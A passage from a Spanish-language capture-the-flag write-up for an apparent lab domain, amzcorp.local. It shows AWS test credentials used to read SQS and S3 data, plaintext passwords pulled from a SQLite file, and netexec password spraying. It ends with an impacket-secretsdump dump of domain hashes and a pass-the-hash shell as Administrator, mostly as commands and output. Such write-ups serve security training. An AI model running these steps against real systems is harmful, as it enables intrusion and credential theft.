 'mapper-murmur3', 'mapper-size', 'analysis-phonetic', 'analysis-smartcn', 'analysis-stempel', 'analysis-ukrainian']
# Default ES modules to exclude (save apprx 66MB in the final image)
ELASTICSEARCH_DELETE_MODULES = ['ingest-geoip']
ELASTICMQ_JAR_URL = 'https://s3-eu-west-1.amazonaws.com/softwaremill-public/elasticmq-server-1.1.0.jar'
STS_JAR_URL = 'https://repo1.maven.org/maven2/com/amazonaws/aws-java-sdk-sts/1.11.14/aws-java-sdk-sts-1.11.14.jar'
STEPFUNCTIONS_ZIP_URL = 'https://s3.amazonaws.com/stepfunctionslocal/StepFunctionsLocal.zip'
KMS_URL_PATTERN = 'https://s3-eu-west-2.amazonaws.com/local-kms/localstack/v3/local-kms.<arch>.bin'

# TODO: Temporarily using a fixed version of DDB in Alpine, as we're hitting a SIGSEGV JVM crash with latest
DYNAMODB_JAR_URL_ALPINE = 'https://github.com/whummer/dynamodb-local/raw/master/etc/DynamoDBLocal.zip'
DYNAMODB_JAR_URL = 'https://s3-us-west-2.amazonaws.com/dynamodb-local/dynamodb_local_latest.zip'

# API endpoint for analytics events
API_ENDPOINT = os.environ.get('API_ENDPOINT') or 'https://api.localstack.cloud/v1'

# environment variable to indicates that this process is running the Web UI
LOCALSTACK_WEB_PROCESS = 'LOCALSTACK_WEB_PROCESS'
LOCALSTACK_INFRA_PROCESS = 'LOCALSTACK_INFRA_PROCESS'

# hardcoded AWS account ID used by moto
MOTO_ACCOUNT_ID = TEST_AWS_ACCOUNT_ID
# fix moto account ID - note: keep this at the top level here
try:
    from moto import core as moto_core
    from moto.core import models as moto_core_models
    moto_core.ACCOUNT_ID = moto_core_models.ACCOUNT_ID = MOTO_ACCOUNT_ID
except Exception:
    # ignore import errors
    pass

# default AWS region us-east-1
AWS_REGION_US_EAST_1 = 'us-east-1'

# default lambda registry
DEFAULT_LAMBDA_CONTAINER_REGISTRY = 'lambci/lambda'

# environment variable to override max pool connections
try:
    MAX_POOL_CONNECTIONS = int(os.environ['MAX_POOL_CONNECTIONS'])
except Exception:
    MAX_POOL_CONNECTIONS = 150

# test credentials used for generating signature for S3 presigned URLs (to be used by external clients)
TEST_AWS_ACCESS_KEY_ID = 'test'
TEST_AWS_SECRET_ACCESS_KEY = 'test'

# credentials being used for internal calls
INTERNAL_AWS_ACCESS_KEY_ID = '__internal_call__'
INTERNAL_AWS_SECRET_ACCESS_KEY = '__internal_call__'

# list of official docker images
OFFICIAL_IMAGES = ['localstack/localstack', 'localstack/localstack-light', 'localstack/localstack-full']

# s3 virtual host name
S3_VIRTUAL_HOSTNAME = 's3.%s' % LOCALHOST_HOSTNAME
S3_STATIC_WEBSITE_HOSTNAME = 's3-website.%s' % LOCALHOST_HOSTNAME

# port for debug py
DEFAULT_DEVELOP_PORT = 5678

# Default bucket name of the s3 bucket used for local lambda development
DEFAULT_BUCKET_MARKER_LOCAL = '__local__'
```

De toda esta informacion de aqui veremos estas lineas interesantes:

```python
TEST_AWS_ACCESS_KEY_ID = 'test'
TEST_AWS_SECRET_ACCESS_KEY = 'test'
```

Esto quiere decir que esta utilizando unas credenciales de `testeo` para el `AWS` mediante estas variables de entorno, por lo que si configuramos dichas variables de entorno a esas credenciales podremos solicitar cosas por `AWS` ya que ese usuario de testo es privilegiado.

Vamos a probar a ejecutar el mismo comando de antes que nos estaba dando error desde el `kali` pero esta vez de esta forma:

```powershell
docker exec 2a0 bash -c "export AWS_ACCESS_KEY_ID='test' && export AWS_SECRET_ACCESS_KEY='test' && export AWS_DEFAULT_REGION='us-east-1' && aws --endpoint-url http://localhost:4566 sqs list-queues"
```

Info:

```
{
    "QueueUrls": [
        "http://localhost:4566/000000000000/sensor_updates"
    ]
}
```

Veremos que ahora si funciona, por lo que estamos viendo hay un `SQS` llamado `sensor_updates` en dicha ruta, por lo que vamos a explorarlo un poco mas, vamos a solicitarle informacion para ver los mensajes que se han enviado por dicho `SQS`.

```powershell
docker exec 2a0 bash -c "export AWS_ACCESS_KEY_ID='test' && export AWS_SECRET_ACCESS_KEY='test' && export AWS_DEFAULT_REGION='us-east-1' && aws --endpoint-url http://localhost:4566 sqs receive-message --queue-url http://localhost:4566/000000000000/sensor_updates"
```

Info:

```
{
    "Messages": [
        {
            "MessageId": "45e75001-5876-8c7d-60a3-43f7499385d4",
            "ReceiptHandle": "quzyfpghykywygpsrsevmzxybulwofhbxxvwolncfhwpprgwtwxagwgmqmpduufwjnlzuuimbhynawqptmnyyenqoqiqpusztrexdjwpvjcifnexdkywcirjuuooqxftadhonylyotodlbikrakaummxkakxjcnmktzdulkxghprywjnjvbtktcgb",
            "MD5OfBody": "7c9db777266f3ef48480f0e9773139a9",
            "Body": "Temperature: 24°c"
        }
    ]
}
```

Vemos que funciona, pero no es informacion muy relevante, aunque si enviamos unas cuantas peticiones mas para ver que mas mensajes se han enviado llegaremos a este:

```powershell
docker exec 2a0 bash -c "export AWS_ACCESS_KEY_ID='test' && export AWS_SECRET_ACCESS_KEY='test' && export AWS_DEFAULT_REGION='us-east-1' && aws --endpoint-url http://localhost:4566 sqs receive-message --queue-url http://localhost:4566/000000000000/sensor_updates"
```

Info:

```
{
    "Messages": [
        {
            "MessageId": "93b06f1a-07aa-d86b-939f-b922ebc5475b",
            "ReceiptHandle": "pjpkghnmcwvxnjwxtlwxzqvmiueypbiilzpgwqgbrobchyfeatglfcbieibeqhllxllhvargvazqfhtzghrzejxcmcooiattskkledicokjenonnyncjenmadvfkccqwjpflszxenpmizunrceafduubhwmcjbswwxkhyalluuhpqkaihuogscejg",
            "MD5OfBody": "724e0f5cb704edcfa5497ec156f713e6",
            "Body": "Faulty Reading. AWS{th4ts_4_l0ng_Q}"
        }
    ]
}
```

Por lo que vemos se encuentra la `flag` de `Long Run`.

> Long Run (Flag)

```
AWS{th4ts_4_l0ng_Q}
```

## Demolish

Teniendo este usuario privilegiado, vamos a investigar el `bucket S3` en busca de archivo o informacion util, primero vamos a listar todo lo que haya en `S3` de esta forma:

```shell
aws --endpoint-url http://cloud.amzcorp.local s3 ls 2>/dev/null || echo "S3 no disponible"
```

Info:

```
2025-12-25 19:54:08 products
2025-12-25 19:54:08 2022-releases
2025-12-25 19:54:09 clients
2025-12-25 19:54:10 databases
2025-12-25 19:54:10 assets
```

Veremos varias interesantes, por lo que vamos a ver que hay dentro de cada una de ellas.

```shell
aws --endpoint-url http://cloud.amzcorp.local s3 ls s3://products/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 ls s3://clients/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 ls s3://databases/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 ls s3://assets/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 ls s3://2022-releases/ --recursive
```

Info:

```
2025-12-25 19:54:19         94 products.csv
2025-12-25 19:54:18        386 clients.csv
2025-12-25 19:54:13      12288 amzcorp_emp_data.db
2025-12-25 19:54:12      12288 amzcorp_orders.db
2025-12-25 19:54:15      12288 amzcorp_products.db
2025-12-25 19:54:14      12288 amzcorp_users.db
2025-12-25 19:54:16        129 releases.csv
```

Vemos que hay archivos, probaremos a descargarnoslos todos en una carpeta.

```shell
mkdir -p downloaded
aws --endpoint-url http://cloud.amzcorp.local s3 cp s3://products/ ./downloaded/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 cp s3://clients/ ./downloaded/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 cp s3://databases/ ./downloaded/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 cp s3://assets/ ./downloaded/ --recursive
aws --endpoint-url http://cloud.amzcorp.local s3 cp s3://2022-releases/ ./downloaded/ --recursive
```

Info:

```
download: s3://products/products.csv to downloaded/products.csv
download: s3://clients/clients.csv to downloaded/clients.csv
download: s3://databases/amzcorp_orders.db to downloaded/amzcorp_orders.db
download: s3://databases/amzcorp_emp_data.db to downloaded/amzcorp_emp_data.db
download: s3://databases/amzcorp_products.db to downloaded/amzcorp_products.db
download: s3://databases/amzcorp_users.db to downloaded/amzcorp_users.db
download: s3://2022-releases/releases.csv to downloaded/releases.csv
```

Veremos que ha funcionado, por lo que vamos analizar todos los archivos en busca de informacion relevante.

Investigando un poco, veremos en el archivo interesante llamado `a` que si listamos sus tablas de esta forma:

```shell
sqlite3 amzcorp_users.db ".tables"
```

Info:

```
users
```

Solamente veremos una llamada `users`, vamos a ver su contenido de esta otra forma:

```shell
sqlite3 amzcorp_users.db "SELECT * FROM users;"
```

Info:

```
1|peter|Summer2021!
2|kevin|amz@123
3|daniel|K2h3v4n@#!5_34
4|leo|G4Df0_%*
5|kent|DF2!@gJhC
6|emiley|BH34@!-FDc00
7|john|BBp_!sXd#vG
```

Tambien si leemos este otro archivo...

```shell
cat clients.csv
```

Info:

```
Username; Identifier;One-time password;Recovery code;First name;Last name;Department;Location
booker12;9012;12se74;rb9012;Rachel;Booker;Sales;Manchester
grey07;2070;04ap67;lg2070;Laura;Grey;Depot;London
johnson81;4081;30no86;cj4081;Craig;Johnson;Depot;London
jenkins46;9346;14ju73;mj9346;Mary;Jenkins;Engineering;Manchester
smith79;5079;09ja61;js5079;Jamie;Smith;Engineering;Manchester
```

Veremos varias credenciales interesantes las cuales vamos agrupar en un `users.txt` y `pass.txt` quedando algo asi:

> users.txt

```
peter
kevin
daniel
leo
kent
emiley
john
booker12
grey07
johnson81
jenkins46
smith79
```

> pass.txt

```
Summer2021!
amz@123
K2h3v4n@#!5_34
G4Df0_%*
DF2!@gJhC
BH34@!-FDc00
BBp_!sXd#vG
12se74
04ap67
30no86
14ju73
09ja61
```

Ahora vamos a realizar una pequeña fuerza bruta con `netexec` a ver que encontramos...

```shell
netexec smb <IP> -u users.txt -p pass.txt
netexec ldap <IP> -u users.txt -p pass.txt
netexec winrm <IP> -u users.txt -p pass.txt
```

Pero no tendremos ningun resultado con ninguno de los servicios, a la desesperada probaremos con algunos usuarios comunes como por ejemplo `Administrator` a ver si fuera alguna de esas contraseñas la suya.

```shell
netexec smb <IP> -u Administrator -p pass.txt
```

Info:

```
SMB         10.13.37.15     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)
SMB         10.13.37.15     445    DC01             [-] amzcorp.local\Administrator:Summer2021! STATUS_LOGON_FAILURE
SMB         10.13.37.15     445    DC01             [-] amzcorp.local\Administrator:amz@123 STATUS_LOGON_FAILURE
SMB         10.13.37.15     445    DC01             [+] amzcorp.local\Administrator:K2h3v4n@#!5_34 (Pwn3d!)
```

Veremos que hemos tenido suerte, por `SMB` y `LDAP` tendremos el usuario `Administrator` con la contraseña `K2h3v4n@#!5_34`.

Ahora vamos a probar a obtener los `hashes NTLM` del dominio ya que tenemos la cuenta del `administrador` por `LDAP` para posteriormente realizar un `Pass-The-Hash` por `WinRM`.

```shell
impacket-secretsdump 'AMZCORP.LOCAL/Administrator:K2h3v4n@#!5_34@<IP>'
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xad7915b8e6d4f9ee383a5176349739e3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ad6134f476425d6ce968856876985c15:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
AMZCORP\DC01$:aes256-cts-hmac-sha1-96:84cddfbe0560f263fdd712378042ee6bbf06b49906cbfe12c6543c5ad919c566
AMZCORP\DC01$:aes128-cts-hmac-sha1-96:3c5ed9d668a8c20af64db4b777811191
AMZCORP\DC01$:des-cbc-md5:cb1085a2f297adc8
AMZCORP\DC01$:plain_password_hex:2a1b19cb7ec9b8fe24d171f20bc634cd04af1f6b981c0d52ec638ced62a39a9e218b0bc008ba792699d6ae6383c8c22e133e3594de2ef87178e830450c174816085514cd7c66ffcf26cfb90f91769214452a2e7913b4d7cd317150966787fd7887992d1421e4c801aba02fc2ed5db9d21bedd3d4b3514b4b211a5b945363ee06975f70b40c7edf9f312f0476e9955419f1363cc4a6e8aef9faaab1ea7194894c8126d2587567f9559acd3af185f76b01192495a1a1a41d751eb2f25e68104605e46701a9c1c1c60fb668ad12a99aed3c54e1d5624933a9ef7ca3034e37312625b2723e2fb8cd8fb088302b11ed6edc47
AMZCORP\DC01$:aad3b435b51404eeaad3b435b51404ee:915f4d51c7fcc03f1061214f6453a772:::
[*] DefaultPassword
AMZCORP\Administrator:K2h3v4n@#!5_34
[*] DPAPI_SYSTEM
dpapi_machinekey:0xee3ee8172d485d91d928e75a6199a2d9d1552d2a
dpapi_userkey:0x872350e7691cd1f10c04962e21f42f7921a64796
[*] NL$KM
 0000   4D 9A AB A3 5A 7A 2F 50  25 FC 83 1A 10 FE 1E A5   M...Zz/P%.......
 0010   D3 B9 9D A8 B5 4E EB 60  2B D6 78 53 7B 73 2A E0   .....N.`+.xS{s*.
 0020   44 A8 77 0C 48 36 37 26  80 D0 2C 90 D4 16 AA E5   D.w.H67&..,.....
 0030   66 53 4B 7F A9 2D 50 99  8A 26 0A 20 40 0D 9B E1   fSK..-P..&. @...
NL$KM:4d9aaba35a7a2f5025fc831a10fe1ea5d3b99da8b54eeb602bd678537b732ae044a8770c4836372680d02c90d416aae566534b7fa92d50998a260a20400d9be1
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c75e55141795c861a00825bbb18d189:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26a32740e7db943b2cdd7fab724b4500:::
amzcorp.local\david:1107:aad3b435b51404eeaad3b435b51404ee:825f207e2ea45404a350b17648450b2d:::
amzcorp.local\jameshauwnnel:2101:aad3b435b51404eeaad3b435b51404ee:8c21a7fa1e905ebe1456a9ea6ce2f75f:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:915f4d51c7fcc03f1061214f6453a772:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:732e58e7c14e6e4a9ac8e24bc78a03a4a3b001958e570ab9921c1bb2b0985911
Administrator:aes128-cts-hmac-sha1-96:ce397f6405e70ff48192f14212bdd0a5
Administrator:des-cbc-md5:9bfe37dc57e0c897
krbtgt:aes256-cts-hmac-sha1-96:ec84845c3801a326eb367997e7b7d64c15617a44fe29997b604d8d6d5e3c775f
krbtgt:aes128-cts-hmac-sha1-96:d670b4f628494bb76f4a3345eba6343f
krbtgt:des-cbc-md5:f2a1cbe33492e901
amzcorp.local\david:aes256-cts-hmac-sha1-96:a3ac7c2cae5f8194e5031e12eb940896f289238137bfac25884a02d636565f53
amzcorp.local\david:aes128-cts-hmac-sha1-96:2a038951637da48858a6355ef58712a9
amzcorp.local\david:des-cbc-md5:9ba2e0c710c4761f
amzcorp.local\jameshauwnnel:aes256-cts-hmac-sha1-96:a8fcbdce2a885781bbae6ccfbede275943f67fe1b7ecf47625fdb891f4cbc9b1
amzcorp.local\jameshauwnnel:aes128-cts-hmac-sha1-96:599d815cf13e0a267245e253b30fe768
amzcorp.local\jameshauwnnel:des-cbc-md5:e35d92df2f8f9240
DC01$:aes256-cts-hmac-sha1-96:84cddfbe0560f263fdd712378042ee6bbf06b49906cbfe12c6543c5ad919c566
DC01$:aes128-cts-hmac-sha1-96:3c5ed9d668a8c20af64db4b777811191
DC01$:des-cbc-md5:16abe580df7301b3
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

De todos estos `hashes` el que nos interesa es el siguiente:

```
Hash: aad3b435b51404eeaad3b435b51404ee:9c75e55141795c861a00825bbb18d189
```

Por lo que vamos a realizar le `Pass-The-Hash` de esta forma:

```shell
impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:9c75e55141795c861a00825bbb18d189" AMZCORP.LOCAL/Administrator@<IP>
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
amzcorp\administrator
```

Veremos que ya estaremos dentro del servidor como el rango mas alto, por lo que podremos leer la ultima `flag`.

> Demolish (Flag)

```
AWS{wr3ck3d_r3s1st0r}
```
